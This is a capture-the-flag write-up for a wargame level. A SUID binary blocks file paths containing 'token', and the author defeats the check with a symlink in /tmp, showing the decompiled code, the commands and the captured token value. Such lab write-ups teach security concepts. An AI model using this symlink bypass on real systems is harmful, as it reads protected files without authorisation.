# foothold

Yet another level without prior information, and yet another level with a
binary in the home... (z.z) zzZ

But, this seem a little fun, because apart from the usual `level08` binary
with the SUID bit, we have a `token` file, that I can't read.

Let's `strings` that binary, this is the relevant sectionj:
```diff
+printf
+strstr
+read
+open
 __libc_start_main
+write
 GLIBC_2.4
 GLIBC_2.0
 PTRh
 QVhT
 UWVS
 [^_]
+%s [file to read]
+token
+You may not access '%s'
+Unable to open %s
+Unable to read fd %d
```

As we can see, it uses the usuals functions for opening and reading a file,
so we can asssume the `token` file is gonna be crucial, but I don't understand
why "token" is also present in a string.

It also has some strings, let's play a little.

When ran without arguments:
```bash
$ ./level08
./level08 [file to read]
```

When ran with random as argument:
```bash

$ ./level08 paco
level08: Unable to open paco: No such file or directory
```
When ran with `token` as argument:
```bash
$ ./level08 token
You may not access 'token'
```

So that's why the `token` string was presen in the binary, that file is
protected.

Of course, absolute and relative routes are protected:
```bash
$ ./level08 /home/user/level08/token
You may not access '/home/user/level08/token'
$ ./level08 ./token
You may not access './token'
```

A symbolic link does not work either, of course:
```bash
$ ln -s ~/token /dev/shm/foo
$ ./level08 /dev/shm/foo
level08: Unable to open /dev/shm/foo: Permission denied
```

Let's see in more depth what is doing:
```c
int main(int argc,char **argv,char **envp)
{
    char *pcVar1;
    int __fd;
    size_t __n;
    ssize_t sVar2;
    int in_GS_OFFSET;
    undefined4 *in_stack_00000008;
    int fd;
    int rc;
    char buf [1024];
    undefined local_414 [1024];
    int local_14;
    
    local_14 = *(int *)(in_GS_OFFSET + 0x14);
    if (argc == 1) {
        printf("%s [file to read]\n",*in_stack_00000008);
        exit(1);
    }
    pcVar1 = strstr((char *)in_stack_00000008[1],"token");
    if (pcVar1 != (char *)0x0) {
        printf("You may not access \'%s\'\n",in_stack_00000008[1]);
        exit(1);
    }
    __fd = open((char *)in_stack_00000008[1],0);
    if (__fd == -1) {
        err(1,"Unable to open %s",in_stack_00000008[1]);
    }
    __n = read(__fd,local_414,0x400);
    if (__n == 0xffffffff) {
        err(1,"Unable to read fd %d",__fd);
    }
    sVar2 = write(1,local_414,__n);
    if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
        __stack_chk_fail();
    }
    return sVar2;
}
```

*Note: I reverse binaries because is cool, don't go saying "you could just had use ltrace", no, okey? no.*

As I thought, `strstr()` to check for the "token" string...

We cannot open the binary to edit the "token" string...

We can see the libc is dynamic... We could compile a libc with a custom `strstr`
and link with our libc with `LD_PRELOAD`...

But it can't be that hard, let's be honest.

# exploit

```bash
# The important thing about the token symlink is that the path is absolute
$ ln -s /home/user/level08/token /tmp/ez
$ ln -s `realpath token` /tmp/ez
$ ln -s ~/token /tmp/ez

$ ./level08 /tmp/ez
quif5eloekouj29ke0vouxean
```

And yeah, another easy one, just `su flag08` and `getflag` and we are ready
to go.

What? Did you think that because it didn't work on `/dev/shm` it would not work
on `/tmp`, noob.

But why? You may ask, well, permissions are the same right...?
```bash
$ ls -ld /run/shm/
drwxrwxrwt 2 root root 180 May 17 01:41 /run/shm/
$ ls -ld /tmp
d-wx-wx-wx 4 root root 180 May 17 01:42 /tmp

$ ls -l /dev/shm/ez
lrwxrwxrwx 1 level08 level08 24 May 17 01:41 /dev/shm/ez -> /home/user/level08/token
$ ls -l /tmp/ez
lrwxrwxrwx 1 level08 level08 24 May 17 01:40 /tmp/ez -> /home/user/level08/token
```

There are a lot of other factors as play here:
- Apparmor: it may be forcing additional access controls beyond standard file permissions.

What is more strange is that when executing the binary with `strace`, both
`/tmp/ez` and `/dev/shm/ez` fails to open, but without `strace`, the `/tmp`
symlink works just fine.

So, this is a mistery... But trying varius thing and directories, specially when
getting weird errors, is important.
